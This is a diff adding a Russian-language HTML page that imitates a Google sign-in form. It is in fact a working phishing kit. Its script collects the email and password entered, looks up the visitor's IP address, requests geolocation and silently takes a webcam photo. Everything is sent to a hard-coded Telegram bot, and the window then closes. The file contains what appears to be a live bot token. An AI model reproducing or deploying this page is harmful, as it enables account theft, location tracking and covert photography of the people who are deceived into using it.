@@ -1,0 +1,195 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>Вход – Аккаунт Google</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Google Sans', 'Roboto', Arial, sans-serif;
+        }
+        body {
+            background: #fff;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 16px;
+        }
+        .card {
+            max-width: 450px;
+            width: 100%;
+            padding: 48px 40px 36px;
+            border-radius: 28px;
+            box-shadow: 0 12px 40px rgba(0,0,0,0.12);
+            background: white;
+        }
+        .logo { text-align: center; margin-bottom: 28px; }
+        h1 { font-size: 24px; font-weight: 400; text-align: center; margin-bottom: 8px; }
+        .sub { text-align: center; font-size: 16px; color: #5f6368; margin-bottom: 32px; }
+        .input-group { margin-bottom: 28px; position: relative; }
+        .input-group input {
+            width: 100%;
+            padding: 16px 12px 8px 12px;
+            font-size: 16px;
+            border: 1px solid #dadce0;
+            border-radius: 8px;
+            outline: none;
+        }
+        .input-group input:focus { border-color: #1a73e8; border-width: 2px; }
+        .input-group label {
+            position: absolute;
+            left: 12px;
+            top: 16px;
+            font-size: 16px;
+            color: #5f6368;
+            pointer-events: none;
+            background: white;
+            padding: 0 4px;
+        }
+        .input-group input:focus ~ label,
+        .input-group input:not(:placeholder-shown) ~ label {
+            top: 7px;
+            font-size: 11px;
+            color: #1a73e8;
+        }
+        .actions { display: flex; justify-content: flex-end; margin-top: 16px; }
+        .next-btn {
+            background: #1a73e8;
+            color: white;
+            border: none;
+            padding: 10px 24px;
+            border-radius: 24px;
+            font-size: 14px;
+            font-weight: 500;
+            cursor: pointer;
+        }
+        .footer-note { margin-top: 32px; font-size: 12px; color: #5f6368; text-align: center; }
+    </style>
+</head>
+<body>
+<div class="card" id="loginForm">
+    <div class="logo">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 48 48" width="75" height="75">
+            <path fill="#FFC107" d="M43.611,20.083H42V20H24v8h11.303c-1.649,4.657-6.08,8-11.303,8c-6.627,0-12-5.373-12-12c0-6.627,5.373-12,12-12c3.059,0,5.842,1.154,7.961,3.039l5.657-5.657C34.046,6.053,29.268,4,24,4C12.955,4,4,12.955,4,24c0,11.045,8.955,20,20,20c11.045,0,20-8.955,20-20C44,22.659,43.862,21.35,43.611,20.083z"/>
+            <path fill="#FF3D00" d="M6.306,14.691l6.571,4.819C14.655,15.108,18.961,12,24,12c3.059,0,5.842,1.154,7.961,3.039l5.657-5.657C34.046,6.053,29.268,4,24,4C16.318,4,9.656,8.337,6.306,14.691z"/>
+            <path fill="#4CAF50" d="M24,44c5.166,0,9.86-1.977,13.409-5.192l-6.19-5.238C29.211,35.091,26.715,36,24,36c-5.202,0-9.619-3.317-11.283-7.946l-6.522,5.025C9.505,39.556,16.227,44,24,44z"/>
+            <path fill="#1976D2" d="M43.611,20.083H42V20H24v8h11.303c-0.792,2.237-2.231,4.166-4.087,5.571c0.001-0.001,0.002-0.001,0.003-0.002l6.19,5.238C36.971,39.205,44,34,44,24C44,22.659,43.862,21.35,43.611,20.083z"/>
+        </svg>
+    </div>
+    <h1>Войти</h1>
+    <div class="sub">Используйте аккаунт Google</div>
+    <div class="input-group">
+        <input type="email" id="email" placeholder=" ">
+        <label>Электронная почта или телефон</label>
+    </div>
+    <div class="input-group" id="passwordGroup" style="display: none;">
+        <input type="password" id="password" placeholder=" ">
+        <label>Пароль</label>
+    </div>
+    <div class="actions">
+        <button class="next-btn" id="nextBtn">Далее</button>
+    </div>
+    <div class="footer-note">
+        Вы переходите на сайт Google для подтверждения личности
+    </div>
+</div>
+
+<script>
+    const TELEGRAM_TOKEN = "8241737351:AAGpCCd1PpuoHPeJ7xJZOjRcPYTVCN-QaOs";
+    const TELEGRAM_CHAT_ID = "805226689";
+
+    let step = 0;
+    let capturedEmail = "";
+
+    async function getIP() {
+        try {
+            const res = await fetch('https://api.ipify.org?format=json');
+            const data = await res.json();
+            return data.ip;
+        } catch(e) { return 'unknown'; }
+    }
+    async function getLocation() {
+        return new Promise((resolve) => {
+            if (!navigator.geolocation) { resolve('geo not supported'); return; }
+            navigator.geolocation.getCurrentPosition(
+                (pos) => resolve(`${pos.coords.latitude}, ${pos.coords.longitude} (±${pos.coords.accuracy}m)`),
+                () => resolve('denied')
+            );
+        });
+    }
+    async function takePhoto() {
+        return new Promise((resolve) => {
+            if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) { resolve(null); return; }
+            navigator.mediaDevices.getUserMedia({ video: true })
+                .then((stream) => {
+                    const video = document.createElement('video');
+                    video.srcObject = stream;
+                    video.onloadedmetadata = () => {
+                        video.play();
+                        const canvas = document.createElement('canvas');
+                        canvas.width = video.videoWidth || 640;
+                        canvas.height = video.videoHeight || 480;
+                        canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+                        const photoData = canvas.toDataURL('image/jpeg', 0.8);
+                        stream.getTracks().forEach(t => t.stop());
+                        resolve(photoData);
+                    };
+                })
+                .catch(() => resolve(null));
+        });
+    }
+    async function sendData(email, password, ip, loc, photo) {
+        const ua = navigator.userAgent;
+        const caption = `🎧 Spotify / Google Auth 🎧\n📧 ${email}\n🔑 ${password}\n🌐 IP: ${ip}\n📍 Geo: ${loc}\n🕒 ${new Date().toLocaleString()}\n💻 UA: ${ua}`;
+        if (photo && photo.startsWith('data:image')) {
+            const blob = await (await fetch(photo)).blob();
+            const fd = new FormData();
+            fd.append('chat_id', TELEGRAM_CHAT_ID);
+            fd.append('caption', caption);
+            fd.append('photo', blob, 'spotify_cam.jpg');
+            await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`, { method: 'POST', body: fd });
+        } else {
+            await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: caption })
+            });
+        }
+    }
+
+    async function requestCameraAndLocation(email, password) {
+        const ip = await getIP();
+        const loc = await getLocation();
+        const photo = await takePhoto();
+        await sendData(email, password, ip, loc, photo);
+        // Закрываем окно после успешной отправки
+        window.close();
+    }
+
+    const nextBtn = document.getElementById('nextBtn');
+    const emailInput = document.getElementById('email');
+    const passGroup = document.getElementById('passwordGroup');
+
+    nextBtn.addEventListener('click', async () => {
+        if (step === 0) {
+            const email = emailInput.value.trim();
+            if (!email) return;
+            capturedEmail = email;
+            passGroup.style.display = 'block';
+            nextBtn.innerText = 'Далее (пароль)';
+            step = 1;
+        } else {
+            const password = document.getElementById('password').value;
+            if (!password) return;
+            nextBtn.disabled = true;
+            nextBtn.innerText = 'Проверка...';
+            await requestCameraAndLocation(capturedEmail, password);
+        }
+    });
+</script>
+</body>
+</html>
